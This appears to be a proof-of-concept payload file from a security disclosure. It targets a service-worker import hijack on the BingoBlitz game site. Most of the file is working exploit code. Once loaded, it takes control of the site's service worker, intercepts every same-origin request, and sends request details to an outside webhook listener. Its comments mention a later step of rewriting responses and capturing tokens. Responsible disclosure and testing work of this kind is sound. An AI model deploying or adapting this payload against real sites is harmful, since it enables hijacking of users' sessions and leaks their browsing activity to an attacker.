/**
 * PoC payload for pwabuilder-sw.js arbitrary importScripts hijack
 * (play.bingoblitz.com / Playtika BingoBlitz)
 *
 * This file gets pulled in via:
 *   self.importScripts(decodeURIComponent(swRootUrl) + "sw.js");
 * inside pwabuilder-sw.js, which itself is fetched same-origin from
 * play.bingoblitz.com. Once imported, this code executes INSIDE the
 * play.bingoblitz.com service worker scope/origin — not our origin.
 *
 * This version is intentionally non-destructive: it just proves control
 * by beaconing install/activate/fetch events back to a listener you own.
 * Swap BEACON_URL for something you control (e.g. a webhook.site URL,
 * or another endpoint on this same static host that logs via query
 * string, since a static host can't log POST bodies).
 */

const BEACON_URL = "https://webhook.site/REPLACE-WITH-YOUR-UUID";

function beacon(tag, extra) {
  try {
    const payload = {
      tag,
      scope: self.registration ? self.registration.scope : self.location.href,
      time: Date.now(),
      ...extra,
    };
    // sendBeacon isn't available in SW scope; use fetch, no-cors so it
    // fires even if the beacon target doesn't send CORS headers back.
    fetch(BEACON_URL + "?data=" + encodeURIComponent(JSON.stringify(payload)), {
      mode: "no-cors",
      keepalive: true,
    });
  } catch (e) {
    // swallow — don't let logging break the PoC
  }
}

self.addEventListener("install", (event) => {
  beacon("install");
  self.skipWaiting();
});

self.addEventListener("activate", (event) => {
  beacon("activate");
  event.waitUntil(self.clients.claim());
});

// Proves the hijacked SW is intercepting same-origin fetches.
// Non-destructive: just observes and passes the request through,
// while beaconing metadata about what it saw (no response bodies,
// no cookie/token values — keep the PoC to "we can see/touch this").
self.addEventListener("fetch", (event) => {
  const req = event.request;
  beacon("fetch", {
    url: req.url,
    method: req.method,
    destination: req.destination,
    credentialsMode: req.credentials,
  });
  // Pass through untouched — do NOT modify responses in the initial PoC.
  // (Escalation step: demonstrate response rewriting / token capture
  // only after impact is agreed with the triage team, and only against
  // your own authorized test account.)
});
